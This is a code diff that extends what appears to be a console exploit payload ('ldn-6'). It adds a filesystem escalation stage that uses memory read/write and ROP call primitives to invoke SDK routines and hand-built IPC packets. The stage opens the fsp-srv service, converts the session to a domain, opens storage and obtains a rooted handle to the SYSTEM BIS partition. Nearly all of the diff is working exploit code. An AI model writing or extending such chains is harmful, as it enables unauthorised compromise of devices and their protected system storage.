@@ -65,7 +65,218 @@
   // accepts any of them (mirrors crc32.expected in targets/civ7/target.json).
   const CRC_OK = [157086863n, 3297870604n];
 
-  const VERSION = 'ldn-5';
+  const VERSION = 'ldn-6';
+
+  // FS-stage helpers: the same CMIF framing the PC engine uses
+  // (shared/ipc.cjs + shared/domain.cjs), ported to run inside the eval.
+  const FSF = {
+    getService: [0x14CC90n, 'fd7bbea9f44f01a9fd030091f30300aa020100b4280040395f0400f181050054ed031faaeb031faaea031faa05000014ed031faaeb031faaea031faae8031f2a'],
+    send:       [0x168C54n, '410400d4c0035fd6'],
+    close:      [0x168BE4n, 'c10200d4c0035fd6'],
+  };
+
+  function le32(v) {
+    const x = BigInt(v) & 0xffffffffn;
+    return [Number(x & 0xffn), Number((x >> 8n) & 0xffn), Number((x >> 16n) & 0xffn), Number(x >> 24n)];
+  }
+  function u32(b, i) {
+    return b[i] + b[i + 1] * 0x100 + b[i + 2] * 0x10000 + b[i + 3] * 0x1000000;
+  }
+  function putBytes(addr, arr) {
+    for (let i = 0; i < arr.length; i++) write8(addr + BigInt(i), BigInt(arr[i]));
+  }
+  function getBytes(addr, n) {
+    const out = [];
+    for (let i = 0; i < n; i++) out.push(Number(read8(addr + BigInt(i))));
+    return out;
+  }
+  function descBytes(a, n, mode) {
+    const A = BigInt(a), N = BigInt(n);
+    return [...le32(Number(N & 0xffffffffn)), ...le32(Number(A & 0xffffffffn)),
+      ...le32(Number(BigInt(mode) | (A >> 36n) << 2n | (N >> 32n) << 24n | ((A >> 32n) & 15n) << 28n))];
+  }
+  // Mirror of ipc.packet(): header, optional special block, descriptors,
+  // 16-align, then SFCI + command + input.
+  function buildPacket(cmd, input, opts) {
+    opts = opts || {};
+    const sendB = opts.send || [], recvB = opts.recv || [];
+    const copies = opts.copies || [], pid = !!opts.pid;
+    const inp = input || [];
+    const special = pid || copies.length > 0;
+    const head = [...le32((4 | sendB.length << 20 | recvB.length << 24) >>> 0),
+      ...le32((Math.ceil((32 + inp.length) / 4) | (special ? 0x80000000 : 0)) >>> 0)];
+    if (special) {
+      head.push(...le32((pid ? 1 : 0) | copies.length << 1));
+      if (pid) head.push(0, 0, 0, 0, 0, 0, 0, 0);
+      for (const h of copies) head.push(...le32(h));
+    }
+    let bytes = head;
+    let at = bytes.length;
+    for (const b of [...sendB, ...recvB]) { bytes = bytes.concat(descBytes(b.address, b.size, b.mode || 0)); at += 12; }
+    at = (at + 15) & ~15;
+    while (bytes.length < at) bytes.push(0);
+    bytes = bytes.concat([83, 70, 67, 73, 0, 0, 0, 0], le32(cmd), [0, 0, 0, 0], inp);
+    return bytes;
+  }
+  // Mirror of domain.dataStart for arrays built above.
+  function dstart(b) {
+    const first = u32(b, 0), second = u32(b, 4);
+    let at = 8;
+    if (second >>> 31) {
+      const sp = u32(b, at);
+      at += 4 + (sp & 1 ? 8 : 0) + 4 * ((sp >>> 1 & 15) + (sp >>> 5 & 15));
+    }
+    at += (first >>> 16 & 15) * 8;
+    at += ((first >>> 20 & 15) + (first >>> 24 & 15) + (first >>> 28 & 15)) * 12;
+    return (at + 15) & ~15;
+  }
+  // Mirror of domain.control().
+  function controlPacket(cmd, input, context) {
+    const b = buildPacket(cmd, input || [], {});
+    const w = le32(context ? 7 : 5);
+    for (let i = 0; i < 4; i++) b[i] = w[i];
+    const at = dstart(b);
+    if (context) {
+      const one = le32(1), ctx = le32(context);
+      for (let i = 0; i < 4; i++) { b[at + 4 + i] = one[i]; b[at + 12 + i] = ctx[i]; }
+    }
+    return b;
+  }
+  // Mirror of domain.domain(): wrap an SFCI packet in a domain-object header,
+  // exactly like wire.domain(): shift the segment 16 bytes, zero-fill the object
+  // header, then write the flags word at +20 over the shifted segment.
+  function domainPacket(objectId, cmd, input, opts) {
+    const b = buildPacket(cmd, input || [], opts || {});
+    const at = dstart(b);
+    const hdr = new Array(16).fill(0);
+    hdr[0] = 1;
+    const sz = 16 + (input || []).length;
+    hdr[2] = sz & 255; hdr[3] = (sz >> 8) & 255;
+    hdr.splice(4, 4, ...le32(objectId));
+    hdr.splice(12, 4, ...le32((opts && opts.context) || 0));
+    const out = [...b.slice(0, at), ...hdr, ...b.slice(at)];
+    const flag = le32(opts && opts.context ? 1 : 0);
+    for (let i = 0; i < 4; i++) out[at + 20 + i] = flag[i];
+    const w0 = (u32(out, 0) & 0xffff0000 | ((opts && opts.context) ? 6 : 4)) >>> 0;
+    const w0b = le32(w0), w1 = le32((u32(out, 4) + 4) >>> 0);
+    for (let i = 0; i < 4; i++) { out[i] = w0b[i]; out[4 + i] = w1[i]; }
+    return out;
+  }
+  // Mirror of ipc.response()/domain.response(): walk headers, grab the
+  // SFCO/SFCI-style result, handles, and reply objects.
+  function parseReply(b) {
+    const first = u32(b, 0), second = u32(b, 4);
+    let at = 8;
+    const copies = [], moves = [];
+    if (second >>> 31) {
+      const sp = u32(b, at); at += 4;
+      if (sp & 1) at += 8;
+      for (let i = 0; i < (sp >>> 1 & 15); i++, at += 4) copies.push(u32(b, at));
+      for (let i = 0; i < (sp >>> 5 & 15); i++, at += 4) moves.push(u32(b, at));
+    }
+    at += (first >>> 16 & 15) * 8;
+    at += ((first >>> 20 & 15) + (first >>> 24 & 15) + (first >>> 28 & 15)) * 12;
+    at = (at + 15) & ~15;
+    const domainReply = b[at] === 1;
+    if (domainReply) {
+      const count = u32(b, at), result = u32(b, at + 24);
+      const objects = [];
+      if (!result) for (let i = 0; i < count; i++) objects.push(u32(b, at + 32 + 4 * i));
+      return {result, objects, moves, copies, dataAt: at + 32};
+    }
+    if (!(b[at] === 83 && b[at + 1] === 70 && b[at + 2] === 67 && b[at + 3] === 79))
+      return {result: 0xffffffff, objects: [], moves, copies, dataAt: at + 16, missing: true};
+    return {result: u32(b, at + 8), objects: [], moves, copies, dataAt: at + 16};
+  }
+
+  // FS escalation, console-side: owned fsp-srv session -> domain -> storage,
+  // then a rooted BIS handle. Mirrors app/session.cjs + memory/fs-root-control.cjs.
+  async function fsStage(sdk) {
+    for (const name of ['getService', 'send', 'close']) {
+      const [off, hexBytes] = FSF[name];
+      for (let j = 0; j * 2 < hexBytes.length; j++)
+        if (read8(sdk + off + BigInt(j)) !== BigInt(parseInt(hexBytes.substr(j * 2, 2), 16))) {
+          await say('fs FAIL: ' + name + ' byte ' + j);
+          return;
+        }
+    }
+    await say('[fs] sdk helpers verified');
+    const w = malloc(0x800);
+    if (!w) { await say('fs FAIL: no work buffer'); return; }
+    const pkt = BigInt(w), svc = BigInt(w) + 0x100n, pathB = BigInt(w) + 0x200n;
+    const handles = [];
+    try {
+      // openService('fsp-srv'): name at svc+8, handle out at svc+0.
+      putBytes(svc, new Array(32).fill(0));
+      putBytes(svc + 8n, [102, 115, 112, 45, 115, 114, 118]);
+      if (call_rop(sdk + FSF.getService[0], svc, svc + 8n, 7n, 0n) !== 0n) {
+        await say('fs FAIL: fsp-srv not found'); return;
+      }
+      const fsp = read32(svc);
+      handles.push(fsp);
+      await say('[f1] fsp-srv handle ' + fsp);
+
+      const xfer = async (label, bytes, handle) => {
+        putBytes(pkt, bytes.concat(new Array(256 - bytes.length).fill(0)));
+        const sent = call_rop(sdk + FSF.send[0], pkt, 4096n, BigInt(handle), 0n);
+        if (sent !== 0n) { await say('fs FAIL: ' + label + ' transport ' + sent); return null; }
+        return parseReply(getBytes(pkt, 256));
+      };
+
+      // Initialize: SetCurrentProcess (cmd 1, PID 0 in the pid block).
+      const init = await xfer('init', buildPacket(1, [0, 0, 0, 0, 0, 0, 0, 0], {pid: true}), fsp);
+      if (!init || init.result !== 0) { await say('fs FAIL: fsp-srv init ' + (init ? init.result : 'x')); return; }
+      await say('[f2] fsp-srv initialized');
+
+      // ConvertToDomain (control cmd 0) -> root object id.
+      const dom = await xfer('domain', controlPacket(0, [], 0), fsp);
+      if (!dom || dom.result !== 0) { await say('fs FAIL: ConvertToDomain ' + (dom ? dom.result : 'x')); return; }
+      const root = u32(getBytes(pkt, 64), dom.dataAt);
+      await say('[f3] domain root ' + root);
+
+      // OpenStorage (domain cmd 200) -> object + session handle, GetSize (cmd 4).
+      const stor = await xfer('storage', domainPacket(root, 200, [], {}), fsp);
+      if (!stor || stor.result !== 0 || !stor.objects.length) {
+        await say('fs FAIL: OpenStorage ' + (stor ? stor.result : 'x')); return;
+      }
+      const storHandle = stor.moves[0] || stor.copies[0];
+      if (storHandle) handles.push(storHandle);
+      if (storHandle) {
+        const size = await xfer('size', buildPacket(4, [], {}), storHandle);
+        if (size && size.result === 0) {
+          const d = getBytes(pkt, 64);
+          await say('[f4] storage size ' + BigInt(u32(d, size.dataAt)));
+        } else await say('[f4] storage size skipped (' + (size ? size.result : 'x') + ')');
+      }
+
+      // OpenBisFileSystem(31 = SYSTEM) + GetEntryType('/') on the rooted handle:
+      // the compact descriptor form from fs-root-control.pathRequest:
+      // word0 = 4 | (1<<16) (one in-desc), descriptor words at offsets 8/12
+      // (packed size/address-high bits, address low 32).
+      putBytes(pathB, [47, ...new Array(0x300).fill(0)]);
+      const pathPacket = (cmd, inp) => {
+        const b = buildPacket(cmd, inp, {});
+        const packed = Number((0x301n << 16n) | ((pathB >> 36n) & 7n) << 6n | ((pathB >> 32n) & 15n) << 12n);
+        const w0 = le32((4 | (1 << 16)) >>> 0), pw = le32(packed),
+          aw = le32(Number(pathB & 0xffffffffn));
+        for (let i = 0; i < 4; i++) { b[i] = w0[i]; b[8 + i] = pw[i]; b[12 + i] = aw[i]; }
+        return b;
+      };
+      const bis = await xfer('bis', pathPacket(11, le32(31)), fsp);
+      if (!bis || bis.result !== 0) { await say('[f5] BIS open result ' + (bis ? bis.result : 'x')); return; }
+      const bisHandle = bis.moves[0] || bis.copies[0];
+      if (!bisHandle) { await say('fs FAIL: BIS handle not returned'); return; }
+      handles.push(bisHandle);
+      const entry = await xfer('entry', pathPacket(7, []), bisHandle);
+      await say('[f5] BIS SYSTEM rooted, entry ' + (entry ? entry.result : 'x'));
+      await say('fs chain PASS');
+    } finally {
+      for (const h of handles.reverse()) {
+        try { call_rop(sdk + FSF.close[0], BigInt(h), 0n, 0n, 0n); } catch (_) {}
+      }
+      try { free(w); } catch (_) {}
+    }
+  }
 
   async function standalone(qmFunc) {
     await say('payload ' + VERSION + ' standalone');
@@ -131,6 +342,7 @@
     }
     await say('[s5] map walk: ' + regions + ' regions, end ' + hex(at2));
     await say('standalone chain PASS');
+    await fsStage(sdk);
   }
   // ================================================================
 
